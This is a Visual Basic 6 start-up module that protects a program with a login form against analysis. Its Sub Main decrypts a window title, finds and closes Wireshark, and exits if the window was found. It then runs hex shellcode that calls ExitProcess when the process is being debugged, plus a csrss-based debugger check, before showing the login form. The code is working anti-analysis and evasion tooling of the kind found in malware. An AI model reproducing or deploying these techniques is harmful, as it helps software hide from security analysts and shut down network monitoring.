Attribute VB_Name = "mMain"
Option Explicit
Public Declare Function ShellExecute Lib "shell32.dll" Alias _
        "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation _
        As String, ByVal lpFile As String, ByVal lpParameters _
        As String, ByVal lpDirectory As String, ByVal nShowCmd _
        As Long) As Long

Public Const RRR = "1001"
Public AAA As String

Public Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Public Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Public Declare Function CallWindowProcA Lib "user32" (ByRef Address As Any, Optional ByVal Param1 As Long, Optional ByVal Param2 As Long, Optional ByVal Param3 As Long, Optional ByVal Param4 As Long) As Long

Public Const sShellcode As String = "64A1300000000FB6400283F80175076A00E8<ADDR>C3"

'IsDbgCrss
Public Declare Function CsrGetProcessId Lib "ntdll.dll" () As Long
Public Declare Function OpenProcess Lib "kernel32.dll" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
' Programm  : Anti Wireshark
' Author    : Inmate
' realease  : 21.08.09
' Used for  : Close Wirehark
' Tested On : Windows 7 x64
'---------------------------------------------------------------------------------------
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" _
(ByVal hwnd As Long, ByVal wMsg As Long, _
ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
(ByVal lpClassName As String, ByVal lpWindowName As String) As Long

'---------------------------------------------------------------------------------------
' Procedure : IsDbgCsrss
' Author    : Karcrack
' Date      : 30/12/2008
' Purpose   : Check if our app is being debugged
' Usage     : If IsDbgCrss = True Then MsgBox "I'm Debugged"
' Tested On : OllyDbg v2.0 ß
' Reference : http://www.piotrbania.com/all/articles/antid.txt
'---------------------------------------------------------------------------------------
'
Public Function IsDbgCsrss() As Boolean
    IsDbgCsrss = CBool(OpenProcess(&H1F0FFF, 0, CsrGetProcessId)) '&H1F0FFF = PROCESS_ALL_ACCESS
End Function

'_ASM{
'     ASSUME FS:NOTHING
'     MOV EAX,DWORD PTR FS:[30h]
'     MOVZX EAX, BYTE PTR [EAX+2]
'
'     .IF (EAX==TRUE)
'           Invoke <ADDR>, 0
'     .ENDIF
'
'     RET
'}

Public Sub AntiDebugger()
    Dim bASM(&HFF)       As Byte
    Dim pExitProcess    As Long
    
    pExitProcess = GetProcAddress(LoadLibraryA("KERNEL32"), "ExitProcess")
    
    Call OPCODES(Replace$(sShellcode, "<ADDR>", Hex$(SwapEndian(pExitProcess - (VarPtr(bASM(0)) + 22)))), bASM)
    Call CallWindowProcA(bASM(0))
End Sub

Public Sub OPCODES(ByVal sThunk As String, ByRef bvTmp() As Byte)
    Dim i               As Long

    For i = 0 To Len(sThunk) - 1 Step 2
        bvTmp((i / 2)) = CByte("&H" & Mid$(sThunk, i + 1, 2))
    Next i
End Sub

Public Function SwapEndian(ByVal dw As Long) As Long
' by Mike D Sutton, Mike.Sutton@btclick.com, 20040914
    SwapEndian = (((dw And &HFF000000) \ &H1000000) And &HFF&) Or ((dw And &HFF0000) \ &H100&) Or ((dw And &HFF00&) * &H100&) Or ((dw And &H7F&) * &H1000000)
    If (dw And &H80&) Then SwapEndian = SwapEndian Or &H80000000
End Function
Sub Main()

Dim WireHandle As Long, WireClose As String, Enc As New clsBlowfish
WireHandle = FindWindow(vbNullString, Enc.DecryptString("ªmiºˆM*cnãÆÜ?xH[L\ß¬2-«î©†ØPÁŒÁ>Áó5d`mü&rÛ°`", "t42tf"))
     WireClose = PostMessage _
     (WireHandle, &H10, 0&, 0&)

Select Case WireHandle
    Case Is > 0
        End
End Select

AntiDebugger

Select Case IsDbgCsrss
    Case True
        End
End Select

Load frmLogin
frmLogin.Label1.Caption = RRR
frmLogin.Show

End Sub
